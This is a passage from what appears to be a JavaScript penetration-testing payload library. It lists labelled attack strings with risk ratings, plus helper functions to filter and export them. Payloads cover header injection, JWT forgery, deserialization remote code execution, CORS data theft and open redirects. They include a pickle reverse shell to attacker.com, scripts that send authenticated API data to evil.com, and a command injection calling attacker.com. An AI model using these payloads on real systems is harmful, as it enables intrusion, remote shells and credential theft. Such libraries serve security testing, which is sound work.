    payload: "%0d%0aContent-Length: 0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0a%0d%0a<html>Fake</html>",
    desc: "HTTP response splitting to inject complete fake response",
    risk: "high",
  },

  // -- Other header attacks --
  {
    cat: "Header Injection",
    name: "header-x-original-url",
    payload: "X-Original-URL: /admin",
    desc: "X-Original-URL override to bypass front-end access controls",
    risk: "high",
  },
  {
    cat: "Header Injection",
    name: "header-x-rewrite-url",
    payload: "X-Rewrite-URL: /admin",
    desc: "X-Rewrite-URL override for path-based authorization bypass",
    risk: "high",
  },
  {
    cat: "Header Injection",
    name: "header-x-custom-ip-auth",
    payload: "X-Custom-IP-Authorization: 127.0.0.1",
    desc: "Custom IP authorization header spoofing for admin access",
    risk: "medium",
  },
  {
    cat: "Header Injection",
    name: "header-referer-sqli",
    payload: "Referer: http://target.com/' OR '1'='1",
    desc: "SQL injection via Referer header logged by analytics",
    risk: "high",
  },

  // =======================================================================
  //  11. JWT Attacks  (16 payloads)
  // =======================================================================

  {
    cat: "JWT Attacks",
    name: "jwt-alg-none",
    payload: "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.",
    desc: "JWT algorithm none attack to bypass signature verification",
    risk: "critical",
  },
  {
    cat: "JWT Attacks",
    name: "jwt-alg-none-capital",
    payload: "eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.",
    desc: "JWT None algorithm variant with capitalized None value",
    risk: "critical",
  },
  {
    cat: "JWT Attacks",
    name: "jwt-alg-none-nOne",
    payload: "eyJhbGciOiJuT25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.",
    desc: "JWT nOnE algorithm variant for case-insensitive bypass",
    risk: "critical",
  },
  {
    cat: "JWT Attacks",
    name: "jwt-alg-confusion-hs256",
    payload: "{\"alg\":\"HS256\",\"typ\":\"JWT\"}",
    desc: "JWT algorithm confusion header switching RS256 to HS256 (sign with public key)",
    risk: "critical",
  },
  {
    cat: "JWT Attacks",
    name: "jwt-alg-confusion-hs384",
    payload: "{\"alg\":\"HS384\",\"typ\":\"JWT\"}",
    desc: "JWT algorithm confusion switching to HS384 symmetric signing",
    risk: "critical",
  },
  {
    cat: "JWT Attacks",
    name: "jwt-weak-secret",
    payload: "{\"alg\":\"HS256\",\"typ\":\"JWT\"} // secret: password123",
    desc: "JWT signed with common weak secret for brute-force attack",
    risk: "high",
  },
  {
    cat: "JWT Attacks",
    name: "jwt-kid-sqli",
    payload: "{\"alg\":\"HS256\",\"typ\":\"JWT\",\"kid\":\"' UNION SELECT 'secret-key' -- \"}",
    desc: "JWT key ID SQL injection to control the signing key lookup",
    risk: "critical",
  },
  {
    cat: "JWT Attacks",
    name: "jwt-kid-path-traversal",
    payload: "{\"alg\":\"HS256\",\"typ\":\"JWT\",\"kid\":\"../../../../../../dev/null\"}",
    desc: "JWT key ID path traversal to use /dev/null as empty signing key",
    risk: "critical",
  },
  {
    cat: "JWT Attacks",
    name: "jwt-kid-command-injection",
    payload: "{\"alg\":\"HS256\",\"typ\":\"JWT\",\"kid\":\"key | curl http://attacker.com/\"}",
    desc: "JWT key ID command injection if kid is passed to shell",
    risk: "critical",
  },
  {
    cat: "JWT Attacks",
    name: "jwt-claim-role-escalation",
    payload: "{\"sub\":\"user123\",\"role\":\"admin\",\"iat\":1700000000,\"exp\":1800000000}",
    desc: "JWT claim manipulation to escalate role from user to admin",
    risk: "critical",
  },
  {
    cat: "JWT Attacks",
    name: "jwt-claim-sub-change",
    payload: "{\"sub\":\"admin\",\"iat\":1700000000,\"exp\":1800000000}",
    desc: "JWT subject claim change to impersonate admin user",
    risk: "critical",
  },
  {
    cat: "JWT Attacks",
    name: "jwt-claim-exp-extend",
    payload: "{\"sub\":\"user\",\"exp\":9999999999}",
    desc: "JWT expiration claim extended to create perpetual token",
    risk: "high",
  },
  {
    cat: "JWT Attacks",
    name: "jwt-claim-iss-spoof",
    payload: "{\"sub\":\"admin\",\"iss\":\"trusted-service\",\"exp\":1800000000}",
    desc: "JWT issuer claim spoofing to impersonate trusted service",
    risk: "high",
  },
  {
    cat: "JWT Attacks",
    name: "jwt-jwk-injection",
    payload: "{\"alg\":\"RS256\",\"typ\":\"JWT\",\"jwk\":{\"kty\":\"RSA\",\"n\":\"attacker-modulus\",\"e\":\"AQAB\"}}",
    desc: "JWT embedded JWK injection to use attacker-supplied public key",
    risk: "critical",
  },
  {
    cat: "JWT Attacks",
    name: "jwt-jku-redirect",
    payload: "{\"alg\":\"RS256\",\"typ\":\"JWT\",\"jku\":\"http://attacker.com/.well-known/jwks.json\"}",
    desc: "JWT JKU header injection to redirect key fetch to attacker server",
    risk: "critical",
  },
  {
    cat: "JWT Attacks",
    name: "jwt-x5u-redirect",
    payload: "{\"alg\":\"RS256\",\"typ\":\"JWT\",\"x5u\":\"http://attacker.com/cert.pem\"}",
    desc: "JWT X5U header injection to supply attacker certificate for verification",
    risk: "critical",
  },

  // =======================================================================
  //  12. Deserialization  (18 payloads)
  // =======================================================================

  // -- Java deserialization --
  {
    cat: "Deserialization",
    name: "deser-java-commons-collections",
    payload: "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA...",
    desc: "Java deserialization gadget chain using Apache Commons Collections",
    risk: "critical",
  },
  {
    cat: "Deserialization",
    name: "deser-java-urldns",
    payload: "rO0ABXNyABFqYXZhLm5ldC5VUkwuLi4...",
    desc: "Java URLDNS deserialization gadget for out-of-band detection",
    risk: "high",
  },
  {
    cat: "Deserialization",
    name: "deser-java-jrmp",
    payload: "rO0ABXNyACxqYXZheC5tYW5hZ2VtZW50LnJlbW90ZS5ybWkuUk1JQ29ubmVjdG9y...",
    desc: "Java JRMP deserialization exploit for remote class loading",
    risk: "critical",
  },
  {
    cat: "Deserialization",
    name: "deser-java-spring",
    payload: "rO0ABXNyAC5vcmcuc3ByaW5nZnJhbWV3b3JrLmJlYW5zLmZhY3RvcnkuT2JqZWN0RmFjdG9yeQ...",
    desc: "Java Spring Framework ObjectFactory deserialization gadget",
    risk: "critical",
  },
  {
    cat: "Deserialization",
    name: "deser-java-beanutils",
    payload: "rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQ...",
    desc: "Java BeanUtils deserialization gadget via PriorityQueue",
    risk: "critical",
  },

  // -- PHP deserialization --
  {
    cat: "Deserialization",
    name: "deser-php-object-injection",
    payload: "O:4:\"User\":2:{s:8:\"username\";s:5:\"admin\";s:5:\"admin\";b:1;}",
    desc: "PHP object injection to set admin attribute to true",
    risk: "critical",
  },
  {
    cat: "Deserialization",
    name: "deser-php-destruct-rce",
    payload: "O:8:\"Exploit\":1:{s:3:\"cmd\";s:2:\"id\";}",
    desc: "PHP deserialization RCE via __destruct or __wakeup magic method",
    risk: "critical",
  },
  {
    cat: "Deserialization",
    name: "deser-php-phar",
    payload: "phar://uploads/evil.phar",
    desc: "PHP phar deserialization attack triggering object instantiation",
    risk: "critical",
  },
  {
    cat: "Deserialization",
    name: "deser-php-guzzle-chain",
    payload: "O:31:\"GuzzleHttp\\Cookie\\FileCookieJar\":1:{s:36:\"\\0GuzzleHttp\\Cookie\\CookieJar\\0cookies\";a:0:{}}",
    desc: "PHP Guzzle deserialization gadget chain for file write",
    risk: "critical",
  },

  // -- Python deserialization --
  {
    cat: "Deserialization",
    name: "deser-python-pickle-rce",
    payload: "cos\nsystem\n(S'id'\ntR.",
    desc: "Python pickle deserialization RCE via os.system",
    risk: "critical",
  },
  {
    cat: "Deserialization",
    name: "deser-python-pickle-reverse-shell",
    payload: "cos\nsystem\n(S'bash -i >& /dev/tcp/attacker.com/4444 0>&1'\ntR.",
    desc: "Python pickle deserialization for reverse shell execution",
    risk: "critical",
  },
  {
    cat: "Deserialization",
    name: "deser-python-yaml-rce",
    payload: "!!python/object/apply:os.system ['id']",
    desc: "Python YAML deserialization RCE via PyYAML unsafe load",
    risk: "critical",
  },
  {
    cat: "Deserialization",
    name: "deser-python-yaml-subprocess",
    payload: "!!python/object/apply:subprocess.check_output [['id']]",
    desc: "Python YAML unsafe deserialization via subprocess module",
    risk: "critical",
  },

  // -- .NET deserialization --
  {
    cat: "Deserialization",
    name: "deser-dotnet-viewstate",
    payload: "__VIEWSTATE=/wEPDwUKMTIzNDU2Nzg5MGRk...",
    desc: ".NET ViewState deserialization attack with crafted payload",
    risk: "critical",
  },
  {
    cat: "Deserialization",
    name: "deser-dotnet-typeconfusedalegate",
    payload: "AAEAAAD/////AQAAAAAAAAAMAgAAAElTeXN0ZW0u...",
    desc: ".NET TypeConfusedDelegate deserialization gadget for RCE",
    risk: "critical",
  },
  {
    cat: "Deserialization",
    name: "deser-dotnet-objectdataprovider",
    payload: "<ResourceDictionary xmlns:d=\"clr-namespace:System.Diagnostics;assembly=system\"><ObjectDataProvider MethodName=\"Start\" ObjectType=\"{x:Type d:Process}\"><ObjectDataProvider.MethodParameters><sys:String>cmd</sys:String><sys:String>/c id</sys:String></ObjectDataProvider.MethodParameters></ObjectDataProvider></ResourceDictionary>",
    desc: ".NET XAML deserialization RCE via ObjectDataProvider",
    risk: "critical",
  },

  // -- Ruby deserialization --
  {
    cat: "Deserialization",
    name: "deser-ruby-marshal",
    payload: "\\x04\\x08o:\\x15Gem::Installer\\x06:\\x0a@optso:\\x08ERB\\x06:\\x09@srci\\x08id",
    desc: "Ruby Marshal deserialization gadget via Gem::Installer chain",
    risk: "critical",
  },
  {
    cat: "Deserialization",
    name: "deser-ruby-yaml",
    payload: "--- !ruby/object:Gem::Requirement\nrequirements: !ruby/object:Gem::DependencyList\nspecs:\n- !ruby/object:Gem::Source\n  uri: http://attacker.com/",
    desc: "Ruby YAML deserialization via Gem::Requirement object chain",
    risk: "critical",
  },

  // =======================================================================
  //  13. CORS Misconfiguration  (12 payloads)
  // =======================================================================

  {
    cat: "CORS",
    name: "cors-origin-reflection",
    payload: "Origin: http://evil.com",
    desc: "Test for CORS origin reflection (server returns Access-Control-Allow-Origin: evil.com)",
    risk: "high",
  },
  {
    cat: "CORS",
    name: "cors-null-origin",
    payload: "Origin: null",
    desc: "Test for CORS null origin acceptance (sandboxed iframe can use null)",
    risk: "high",
  },
  {
    cat: "CORS",
    name: "cors-subdomain-wildcard",
    payload: "Origin: http://evil.target.com",
    desc: "Test for CORS subdomain wildcard match on target domain",
    risk: "high",
  },
  {
    cat: "CORS",
    name: "cors-prefix-match",
    payload: "Origin: http://target.com.evil.com",
    desc: "Test for CORS prefix matching vulnerability (appended domain)",
    risk: "high",
  },
  {
    cat: "CORS",
    name: "cors-suffix-match",
    payload: "Origin: http://eviltarget.com",
    desc: "Test for CORS suffix matching bypass (prepended to domain)",
    risk: "high",
  },
  {
    cat: "CORS",
    name: "cors-credential-theft-script",
    payload: "<script>var req=new XMLHttpRequest();req.onload=function(){fetch('http://evil.com/steal?data='+btoa(this.responseText))};req.open('GET','http://target.com/api/user',true);req.withCredentials=true;req.send();</script>",
    desc: "CORS exploitation script to steal authenticated API data",
    risk: "critical",
  },
  {
    cat: "CORS",
    name: "cors-fetch-exfil",
    payload: "fetch('http://target.com/api/profile',{credentials:'include'}).then(r=>r.text()).then(d=>fetch('http://evil.com/log?'+btoa(d)))",
    desc: "CORS exploitation using fetch API with credentials for data theft",
    risk: "critical",
  },
  {
    cat: "CORS",
    name: "cors-method-override",
    payload: "Origin: http://evil.com\r\nAccess-Control-Request-Method: PUT",
    desc: "CORS preflight test for dangerous HTTP method allowance",
    risk: "medium",
  },
  {
    cat: "CORS",
    name: "cors-header-injection",
    payload: "Origin: http://evil.com\r\nAccess-Control-Request-Headers: X-Custom-Header",
    desc: "CORS preflight test for custom header allowance",
    risk: "medium",
  },
  {
    cat: "CORS",
    name: "cors-special-chars",
    payload: "Origin: http://target.com%60.evil.com",
    desc: "CORS bypass attempt using special character in origin URL",
    risk: "medium",
  },
  {
    cat: "CORS",
    name: "cors-underscore-bypass",
    payload: "Origin: http://target_com.evil.com",
    desc: "CORS bypass attempt using underscore substitution in domain",
    risk: "medium",
  },
  {
    cat: "CORS",
    name: "cors-protocol-switch",
    payload: "Origin: https://evil.com",
    desc: "CORS test with HTTPS origin against HTTP target for protocol mismatch",
    risk: "medium",
  },

  // =======================================================================
  //  14. Open Redirect  (14 payloads)
  // =======================================================================

  // -- URL-based --
  {
    cat: "Open Redirect",
    name: "redirect-basic-url",
    payload: "http://evil.com",
    desc: "Basic open redirect to external attacker-controlled domain",
    risk: "medium",
  },
  {
    cat: "Open Redirect",
    name: "redirect-double-slash",
    payload: "//evil.com",
    desc: "Protocol-relative open redirect using double slash prefix",
    risk: "medium",
  },
  {
    cat: "Open Redirect",
    name: "redirect-backslash",
    payload: "\\\\evil.com",
    desc: "Open redirect using backslashes (parsed as forward slash on some servers)",
    risk: "medium",
  },
  {
    cat: "Open Redirect",
    name: "redirect-at-sign",
    payload: "http://target.com@evil.com",
    desc: "Open redirect using @ sign to make target.com appear as username",
    risk: "medium",
  },

  // -- Parameter-based --
  {
    cat: "Open Redirect",
    name: "redirect-param-next",
    payload: "?next=http://evil.com",
    desc: "Open redirect via next parameter commonly used in login flows",
    risk: "medium",
  },
  {
    cat: "Open Redirect",
    name: "redirect-param-url",
    payload: "?url=http://evil.com",
    desc: "Open redirect via url parameter in redirect handlers",
    risk: "medium",
  },
  {
    cat: "Open Redirect",
    name: "redirect-param-redirect-uri",
    payload: "?redirect_uri=http://evil.com/callback",
    desc: "Open redirect via redirect_uri parameter in OAuth flows",
    risk: "high",
  },
  {
    cat: "Open Redirect",
    name: "redirect-param-return-to",
    payload: "?return_to=http://evil.com",
    desc: "Open redirect via return_to parameter after authentication",
    risk: "medium",
  },

  // -- JavaScript-based --
  {
    cat: "Open Redirect",
    name: "redirect-javascript-uri",
    payload: "javascript:window.location='http://evil.com'",
    desc: "Open redirect via JavaScript URI in href or location sink",
    risk: "high",
  },
  {
    cat: "Open Redirect",
    name: "redirect-data-uri",
    payload: "data:text/html,<script>window.location='http://evil.com'</script>",
    desc: "Open redirect via data URI with embedded redirect script",
    risk: "high",
  },

  // -- Double encoding --
  {
    cat: "Open Redirect",
    name: "redirect-double-encode-slash",
    payload: "http:%252f%252fevil.com",
    desc: "Open redirect using double-encoded forward slashes",
    risk: "medium",
  },
  {
    cat: "Open Redirect",
    name: "redirect-url-encode-full",
    payload: "%68%74%74%70%3a%2f%2f%65%76%69%6c%2e%63%6f%6d",
    desc: "Open redirect using full URL encoding of http://evil.com",
    risk: "medium",
  },
  {
    cat: "Open Redirect",
    name: "redirect-tab-newline",
    payload: "http://evil%09.com",
    desc: "Open redirect with tab character bypass in URL parser",
    risk: "medium",
  },
  {
    cat: "Open Redirect",
    name: "redirect-whitespace-bypass",
    payload: " http://evil.com",
    desc: "Open redirect with leading whitespace to bypass URL validation",
    risk: "medium",
  },

];

// ---------------------------------------------------------------------------
// Validation and statistics helpers
// ---------------------------------------------------------------------------

const VALID_RISKS = new Set(["info", "low", "medium", "high", "critical"]);

const VALID_CATEGORIES = new Set([
  "SQLi",
  "XSS",
  "Command Injection",
  "LFI/RFI",
  "SSRF",
  "XXE",
  "SSTI",
  "NoSQL Injection",
  "LDAP Injection",
  "Header Injection",
  "JWT Attacks",
  "Deserialization",
  "CORS",
  "Open Redirect",
]);

/**
 * Return category counts: { "SQLi": 55, "XSS": 50, ... }
 */
function categoryCounts() {
  const counts = {};
  for (const p of PAYLOAD_LIBRARY) {
    counts[p.cat] = (counts[p.cat] || 0) + 1;
  }
  return counts;
}

/**
 * Return risk-level counts: { info: 0, low: 0, medium: N, high: N, critical: N }
 */
function riskCounts() {
  const counts = { info: 0, low: 0, medium: 0, high: 0, critical: 0 };
  for (const p of PAYLOAD_LIBRARY) {
    if (counts[p.risk] !== undefined) {
      counts[p.risk]++;
    }
  }
  return counts;
}

/**
 * Filter payloads by category, risk, or keyword in name/desc.
 *
 * @param {object} opts
 * @param {string} [opts.cat]     - Category exact match
 * @param {string} [opts.risk]    - Risk level exact match
 * @param {string} [opts.search]  - Case-insensitive substring in name or desc
 * @returns {object[]}
 */
function filterPayloads(opts) {
  let results = PAYLOAD_LIBRARY;
  if (opts.cat) {
    const cat = opts.cat;
    results = results.filter((p) => p.cat === cat);
  }
  if (opts.risk) {
    const risk = opts.risk;
    results = results.filter((p) => p.risk === risk);
  }
  if (opts.search) {
    const lc = opts.search.toLowerCase();
    results = results.filter(
      (p) => p.name.toLowerCase().includes(lc) || p.desc.toLowerCase().includes(lc)
    );
  }
  return results;
}

/**
 * Look up a single payload by exact name.
 *
 * @param {string} name
 * @returns {object|undefined}
 */
function getPayloadByName(name) {
  return PAYLOAD_LIBRARY.find((p) => p.name === name);
}

/**
 * Return an array of distinct category names.
 *
 * @returns {string[]}
 */
function listCategories() {
  return [...new Set(PAYLOAD_LIBRARY.map((p) => p.cat))];
}

/**
 * Return a random payload, optionally filtered by category.
 *
 * @param {string} [cat] - Optional category filter
 * @returns {object}
 */
function randomPayload(cat) {
  let pool = PAYLOAD_LIBRARY;
  if (cat) {
    pool = pool.filter((p) => p.cat === cat);
  }
  if (pool.length === 0) return null;
  return pool[Math.floor(Math.random() * pool.length)];
}

// ---------------------------------------------------------------------------
// Exports
// ---------------------------------------------------------------------------

module.exports = {
  PAYLOAD_LIBRARY,
  VALID_RISKS,
  VALID_CATEGORIES,
  categoryCounts,
  riskCounts,
  filterPayloads,
  getPayloadByName,
  listCategories,
  randomPayload,
};
